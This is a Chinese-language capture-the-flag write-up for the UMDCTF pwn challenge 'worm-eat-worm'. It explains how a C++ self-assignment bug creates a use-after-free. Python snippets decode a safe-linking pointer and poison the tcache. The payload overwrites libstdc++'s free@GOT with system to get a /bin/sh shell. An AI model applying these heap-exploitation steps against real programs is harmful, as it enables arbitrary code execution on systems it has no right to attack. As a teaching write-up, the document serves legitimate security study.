# worm-eat-worm

## 题目简述

`Worm` 的复制构造函数会深拷贝字符串，但复制赋值运算符先释放目标字符串，再直接复制源指针，形成浅拷贝。让一个 worm “吃掉自己”即可制造 use-after-free。题目同时泄露 libc 的 `stdin` 和 `std::cout` 的 vtable 指针，目标是绕过 safe-linking，将下一次 C++ `new[]` 引向 `libstdc++.so.6` 自己的 `free@GOT`，再把它改成 `system`。

## 解题过程

漏洞位于赋值运算符：

```cpp
Worm& operator=(const Worm& other) {
    delete[] cstring;
    cstring = other.cstring;
    return *this;
}
```

若选择 `a = b = 0`，`other` 与 `this` 是同一对象。`delete[]` 释放字符串后，赋回去的仍是刚被释放的地址，因此 worm 0 保留一个悬空指针。创建三个 worm 后执行自赋值，大小约为 `0x70` 的字符串 chunk 进入 tcache。

`Get` 只允许使用一次，但足以把被释放 chunk 用户区开头的 safe-linking `fd` 当作字符串打印。官方脚本逐 12 位反推真实指针：

```python
encoded = u64(io.recvline().rstrip().ljust(8, b"\x00"))
decoded = encoded
bits = 0xfff << 52
while bits:
    decoded ^= (decoded & bits) >> 12
    bits >>= 12
mask = encoded ^ decoded
```

其中 `mask` 就是该 tcache 节点地址右移 12 位得到的编码掩码。

程序开头的第一处泄露是 `_IO_2_1_stdin_`，用题目附带的 `libc.so.6` 符号偏移可求 libc 基址和 `system`。第二处泄露是 `std::cout` 的 vtable 指针。对所附 `libstdc++.so.6` 检查重定位表可知，其 `free@GOT` 位于该泄露地址上方 `0x3920`：

```text
libstdc++ free@GOT = cout_vptr + 0x3920
```

通过 `Rename` 向悬空 chunk 写入编码后的 `free@GOT - 0x10`，完成 tcache poisoning：

```python
target = cout_vptr + 0x3920 - 0x10
poison = p64(target ^ mask)
rename(0, poison + b"/bin/sh\x00")
```

下一次创建 worm 时，临时对象的 `new char[100]` 返回 `free@GOT - 0x10`。向这块“字符串缓冲区”写入两个 `/bin/sh` 和 `system` 地址，前 16 字节成为命令字符串，第三个机器字恰好覆盖 `free@GOT`：

```python
new_worm(b"/bin/sh\x00" * 2 + p64(libc.sym["system"]))
```

临时 `Worm` 随后析构，`delete[]` 最终经 libstdc++ 的 `free@GOT` 调用 `system`；传入的指针正是 `free@GOT - 0x10`，该位置以 `/bin/sh` 开头，于是获得 shell。读取：

```text
UMDCTF{libstdc++_has_a_GOT_too}
```

## 方法总结

本题的关键是 C++ 所有权错误，而不是 vector 越界：自赋值把已释放指针保留在对象中，`Get` 泄露 tcache 链，`Rename` 写入伪造链头。Full RELRO 只保护主程序并不代表所有已加载共享库都没有可写 GOT；这里选择 libstdc++ 的 `free@GOT - 0x10`，还能让被劫持的 `free` 同时拿到可直接执行的 `/bin/sh` 参数。
